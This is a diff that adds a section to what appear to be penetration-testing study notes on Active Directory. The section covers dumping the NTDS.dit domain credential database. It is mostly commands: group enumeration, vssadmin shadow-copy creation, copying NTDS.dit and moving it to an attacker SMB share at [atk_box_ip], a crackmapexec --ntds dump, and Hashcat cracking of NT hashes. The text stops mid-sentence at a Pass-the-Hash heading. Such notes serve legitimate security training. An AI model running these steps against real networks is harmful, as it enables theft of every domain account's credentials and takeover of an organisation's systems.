@@ -262,3 +262,44 @@ Once credentials have been obtained, we can use a tool like [[Evil-Winrm]] to co
 ```sh
 $ evil-winrm -i [target_ip] -u [user] -p [pass]
 ```
+```Powershell
+# Check local groups of user (we are looking for local admin or domain admin in order to copy the NTDS.dit file later) 
+PS C:\> net localgroup
+
+# Check domain privileges
+PS C:\> net user [user]
+```
+
+Using `vssadmin`, we can create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)(*VSS*) of the drive that AD is installed into (Almost always `C:`). VSS allows us to make a copy of data that is currently in-use by an application without having to take the application down (often in DR or backup solutions).
+
+```PowerShell
+PS C:\> vssadmin CREATE SHADOW /For=C:
+
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2013 Microsoft Corp.
+
+Successfully created shadow copy for 'C:\'
+    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+```
+We can then copy the NTDS.dit from the VSS, and move it to our attack machine:
+```PowerShell
+PS C:\NTDS> cmd.exe /c copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
+
+# Example using an SMB Share to copy it back to attack machine
+PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\[atk_box_ip]\Share
+```
+
+**Alternative Method using CME**
+```sh
+$ crackmapexec smb [target_ip] -u [user] -p [pass] --ntds
+```
+
+The NT hashes can then be cracked using [[Hashcat#Dictionary Attack|Hashcat]].
+```sh
+$ sudo hashcat -m 1000 [hash] [wordlist]
+```
+*If we are unsuccessful in cracking a hash, there are other methods that can be used to [[Password Attacks#Pass-the-Hash|Pass-the-Hash]]*.
+
+### Pass-The-Hash
+A Pass-the-Hash
